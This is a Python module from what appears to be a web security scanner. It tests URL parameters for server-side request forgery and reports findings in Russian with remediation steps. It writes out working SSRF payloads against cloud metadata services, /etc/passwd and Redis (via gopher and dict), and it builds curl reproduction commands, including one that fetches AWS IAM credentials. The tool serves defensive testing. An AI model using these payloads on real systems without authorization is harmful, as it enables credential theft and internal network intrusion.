from __future__ import annotations
import re
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import requests

from ..findings import Finding, Severity
from ..session import session_to_curl_flags


SSRF_URL_PARAMS = [
    "url", "uri", "link", "src", "source", "dest", "destination",
    "redirect", "redirect_url", "path", "file", "page", "endpoint",
    "host", "server", "callback", "webhook", "feed", "fetch",
    "proxy", "target", "next", "location", "ref", "image_url",
    "avatar", "logo", "icon", "document", "pdf", "report",
]

# Internal/SSRF payloads — try to detect response differences
SSRF_PAYLOADS = [
    ("http://127.0.0.1/", "localhost HTTP"),
    ("http://localhost/", "localhost alias"),
    ("http://169.254.169.254/latest/meta-data/", "AWS metadata"),
    ("http://169.254.169.254/metadata/instance", "Azure metadata"),
    ("http://metadata.google.internal/computeMetadata/v1/", "GCP metadata"),
    ("http://[::1]/", "IPv6 localhost"),
    ("http://0.0.0.0/", "0.0.0.0 (all interfaces)"),
    ("http://0/", "short localhost"),
    ("http://2130706433/", "localhost as decimal IP"),
    ("http://0177.0.0.1/", "localhost as octal"),
    ("dict://127.0.0.1:6379/info", "Redis dict://"),
    ("file:///etc/passwd", "file:// LFI"),
    ("gopher://127.0.0.1:6379/_PING%0D%0A", "Redis via gopher"),
]

# Cloud metadata indicators in response
METADATA_SIGNATURES = [
    r"ami-[a-z0-9]{8,17}",               # AWS AMI ID
    r"instance-id",
    r"iam/security-credentials",
    r'"computeMetadata"',
    r"compute/v1/instances",
    r"metadata\.google\.internal",
    r"169\.254\.169\.254",
    r"root:.*:0:0:",                      # /etc/passwd
    r"\+OK\s+Redis",                      # Redis PONG
]


def run(session: requests.Session, base_url: str, endpoints: list, store) -> None:
    print("[*] Checking SSRF...")
    curl_auth = session_to_curl_flags(session)
    timeout = getattr(session, 'timeout', 15)

    for ep in endpoints:
        _check_endpoint_ssrf(session, ep, curl_auth, timeout, store)


def _check_endpoint_ssrf(session, ep, curl_auth, timeout, store):
    parsed = urlparse(ep.url)
    qs = parse_qs(parsed.query)

    # Check URL-like parameters
    url_params = {k: v[0] for k, v in qs.items()
                  if k.lower() in SSRF_URL_PARAMS}

    for param, original_val in url_params.items():
        # Get baseline response
        try:
            baseline = session.get(ep.url, timeout=timeout)
            baseline_len = len(baseline.text)
            baseline_code = baseline.status_code
        except Exception:
            continue

        for payload, label in SSRF_PAYLOADS:
            new_qs = qs.copy()
            new_qs[param] = [payload]
            test_url = urlunparse((
                parsed.scheme, parsed.netloc, parsed.path,
                parsed.params, urlencode(new_qs, doseq=True), ""
            ))
            try:
                resp = session.get(test_url, timeout=8, allow_redirects=True)
            except Exception:
                continue

            # Check response for SSRF indicators
            for sig in METADATA_SIGNATURES:
                if re.search(sig, resp.text, re.IGNORECASE):
                    store.add(Finding(
                        title=f"SSRF (Server-Side Request Forgery) — параметр '{param}'",
                        severity=Severity.CRITICAL,
                        category="SSRF",
                        cwe="CWE-918",
                        description=(
                            f"Параметр '{param}' позволяет серверу делать HTTP-запросы к внутренним ресурсам.\n"
                            f"Техника: {label}\n"
                            "В ответе обнаружены признаки доступа к внутреннему сервису или метаданным облака."
                        ),
                        url=ep.url,
                        parameter=param,
                        evidence=(
                            f"Payload: {payload}\n"
                            f"Найдено в ответе: {re.search(sig, resp.text, re.IGNORECASE).group()[:200]}\n"
                            f"HTTP status: {resp.status_code}"
                        ),
                        remediation=(
                            "1. Валидируйте и разрешайте только ожидаемые схемы (https://) и домены.\n"
                            "2. Запретите запросы к RFC-1918 адресам (10.x, 172.16.x, 192.168.x, 127.x).\n"
                            "3. Запретите запросы к 169.254.169.254 на уровне сети/iptables.\n"
                            "4. Используйте SSRF-safe HTTP-клиент с проверкой IP назначения.\n"
                            "5. Отключите неиспользуемые URL-схемы (file, gopher, dict, ftp)."
                        ),
                        reproduction=(
                            f"curl -sk {curl_auth} '{test_url}'\n\n"
                            f"# AWS metadata через SSRF:\n"
                            f"curl -sk {curl_auth} "
                            f"'{ep.url}?{param}=http://169.254.169.254/latest/meta-data/iam/security-credentials/'"
                        ),
                    ))
                    break

            # Check for response length difference (blind SSRF indicator)
            if resp.status_code == 200 and baseline_code != 200:
                if len(resp.text) > 200:
                    store.add(Finding(
                        title=f"Потенциальный Blind SSRF — параметр '{param}'",
                        severity=Severity.MEDIUM,
                        category="SSRF",
                        cwe="CWE-918",
                        description=(
                            f"Запрос с payload '{payload}' в параметре '{param}' "
                            f"вернул HTTP 200, тогда как базовый запрос вернул {baseline_code}. "
                            "Требует ручной верификации через внешний коллаборатор (Burp Collaborator, interactsh)."
                        ),
                        url=ep.url,
                        parameter=param,
                        evidence=f"Baseline: {baseline_code}\nSSRF probe: {resp.status_code}",
                        remediation=(
                            "1. Запретите серверу делать исходящие запросы к произвольным URL.\n"
                            "2. Используйте allowlist для разрешённых адресов назначения."
                        ),
                        reproduction=(
                            f"# Используйте interactsh для blind SSRF:\n"
                            f"# 1. interactsh-client -v -o /tmp/interactsh.log &\n"
                            f"# 2. Замените payload на ваш interactsh URL:\n"
                            f"curl -sk {curl_auth} '{ep.url}?{param}=https://YOUR.oast.me/'\n"
                            f"# 3. Проверьте /tmp/interactsh.log на входящие запросы"
                        ),
                    ))
